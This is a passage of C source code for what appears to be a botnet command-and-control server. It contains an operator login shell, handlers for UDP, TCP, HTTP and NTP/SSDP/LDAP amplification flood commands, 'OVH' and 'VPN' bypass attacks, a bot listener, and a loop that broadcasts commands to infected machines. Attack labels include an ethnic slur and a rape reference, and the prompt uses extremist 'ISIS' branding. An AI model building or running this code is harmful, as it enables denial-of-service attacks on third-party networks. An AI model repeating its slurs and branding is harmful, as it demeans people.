//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK
  sprintf(ls1,  "\e[1;33m ╔═══════════════════════╗\r\n");//KKKKKKKKKKKKKKKKKKKKKKKKKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK
  sprintf(ls2,  "\e[1;33m ║      \e[37mIPHM Server      \e[1;33m╠╗\r\n");//KKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK//KKKKKKKKKKKKKKKKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK
  sprintf(ls3,  "\e[1;33m ╚══════════╦╦═══════════╝║\r\n");//KKKKKKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK
  sprintf(ls4,  "\e[1;33m            ║║            ╚═> \e[1;36mOnline\e[1;33m.\r\n");//KKKKKKKKKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK
  sprintf(ls5,  "\e[1;33m            ║║            ╔═> \e[1;36mOnline\e[1;33m.\r\n");//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK            
  sprintf(ls6,  "\e[1;33m ╔══════════╩╩═══════════╗║\r\n");//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK
  sprintf(ls7,  "\e[1;33m ║      \e[37mAPI Server       \e[1;33m╠╝\r\n");//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK
  sprintf(ls8,  "\e[1;33m ╚═══════════════════════╝\r\n");//KKKKKKKKKKKKKKKKKKKK//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK
//KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK				
				if(send(datafd, ls1,  strlen(ls1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls2,  strlen(ls2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls3,  strlen(ls3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls4,  strlen(ls4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls5,  strlen(ls5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls6,  strlen(ls6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls7,  strlen(ls7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls8,  strlen(ls8),	MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[31m%s\e[1;35m~\e[1;33mISIS\e[94m#\e[37m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
			if(strstr(buf, "STOP"))
			{
				char killattack [2048];
				memset(killattack, 0, 2048);
				char killattack_msg [2048];
				
				sprintf(killattack, "\e[96m[ATTACKS] \e[37mAttempting To Stop All Attacks\r\n");
				broadcast(killattack, datafd, "output.");
				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [5000];
        sprintf(input, "\e[31m%s\e[1;35m~\e[1;33mISIS\e[94m#\e[37m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}

		if(strstr(buf, "!* UDP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mUDP \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* TCP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mTCP \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* STD")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mSTD \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* FLUX")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mFLUX \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* HTTPHEX")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mHTTPHEX \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* ZAP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mZAP \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* 100UP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33m100UP \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* PAKI")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Attacking The Kid With \x1b[1;33mPaki \x1b[1;31mBombs!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* NUKE")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mISIS \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* LDAP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mLDAP - IPHM \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* NTP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mNTP - IPHM \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* SNMP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mSNMP - IPHM \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* TFTP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mTFTP - IPHM \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* SSDP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mSSDP - IPHM \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* TELNET")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mTELNET - IPHM \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* SLAP-OVH")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mOVH-KILLER V3 [Security Team] \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* OVH")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mOVH Bypass \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* VPN")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mVPN Bypass \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* NFO")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;33mISIS\x1b[1;31m] Sending \x1b[1;33mNFO-RAPE [Kaiten Botnet] \x1b[1;31mAttack!\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
			if(strstr(buf, "CLEAR") || strstr(buf, "clear") || strstr(buf, "Clear") || strstr(buf, "cls") || strstr(buf, "CLS") || strstr(buf, "Cls")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [5000];
        sprintf(input, "\e[31m%s\e[1;35m~\e[1;33mISIS\e[94m#\e[37m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "EXIT")) {
				char logoutmessage [2048];
				memset(logoutmessage, 0, 2048);
				sprintf(logoutmessage, "\e[96m[LOGOUT] \e[37m%s Has Been Logged Out", accounts[find_line].username);
				if(send(datafd, logoutmessage, strlen(logoutmessage), MSG_NOSIGNAL) == -1)goto end;
				sleep(2);
				goto end;
			}

            trim(buf);
		char input [5000];
        sprintf(input, "\e[31m%s\e[1;35m~\e[1;33mISIS\e[94m#\e[37m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("%s: \"%s\"\n",accounts[find_line].username, buf);

			FILE *LogFile;
            LogFile = fopen("history.log", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			char lcltime[50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "[%s] %s: %s\n", formatted_gmt, accounts[find_line].username, buf);
            fclose(LogFile);
            broadcast(buf, datafd, accounts[find_line].username);
            memset(buf, 0, 2048);
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}
void *BotListener(int port) {
	int sockfd, newsockfd;
	socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1) {
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
}}
int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
        telFD = fopen("telnet.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
